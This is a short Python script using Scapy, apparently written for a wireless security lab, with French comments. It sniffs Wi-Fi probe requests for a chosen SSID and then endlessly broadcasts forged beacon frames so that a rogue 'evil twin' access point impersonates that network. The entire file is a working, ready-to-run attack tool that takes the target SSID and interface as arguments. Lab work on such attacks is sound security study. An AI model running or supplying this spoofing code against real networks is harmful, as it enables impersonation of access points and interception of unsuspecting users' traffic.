#!/usr/bin/env python3.6
# Beacon forging based on : https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/

"""
Ce script permet de créer un evil twin lorsqu'une probe request a été scannée pour un AP spécifique

Syntax d'utilisation : sudo python script_1.py ssid interface timeout

Auteurs : Polier Florian, Tran Eric
Date : 16.03.2020
"""

from scapy.all import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("ssid", help="SSID to attack")
parser.add_argument("interface", help="interface to scan on")
parser.add_argument("timeout", help="time to scan")
args = parser.parse_args()

APToAttack = None

# On sniff les probe requests
def sniffHandler(trame):
    global APToAttack
    if trame.haslayer(Dot11ProbeReq):
        if trame.haslayer(Dot11Elt):
            decodeInfo = trame.info.decode("utf-8")
            # Si la trame concerne le SSID que nous voulons attaquer, nous l'assignons à la variable global
            if decodeInfo == args.ssid:
                APToAttack = trame                

sniff(iface=args.interface, prn=sniffHandler, timeout=int(args.timeout)) 
# Si après le sniff rien n'a été trouvé, on arrête le programme
if APToAttack is None:
    print("L'AP cible n'a pas été trouvé")
    sys.exit()

# Une fois que la cible a été trouvée, on construit une beacon frame pour devenir un evil twin
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
beacon = Dot11Beacon(cap='ESS+privacy')
chann = Dot11Elt(ID="DSset", len=1, info=0x6)
essid = Dot11Elt(ID='SSID',info=args.ssid, len=len(args.ssid))
rsn = Dot11Elt(ID='RSNinfo', info=(
'\x01\x00'                 #RSN Version 1
'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
'\x00\x0f\xac\x04'         #AES Cipher
'\x00\x0f\xac\x02'         #TKIP Cipher
'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
'\x00\x0f\xac\x02'         #Pre-Shared Key
'\x00\x00'))               #RSN Capabilities (no extra capabilities)

# On assemble les différents layers du paquet créé et on affiche les infos
frame = RadioTap()/dot11/beacon/essid/chann/rsn
frame.show()
print("\nHexdump of frame:")
hexdump(frame)
input("\nPress enter to send evil twins beacon frame\n")
# On envoie les beacons dans une boucle infinie
sendp(frame, iface=args.interface, inter=0.100, loop=1)

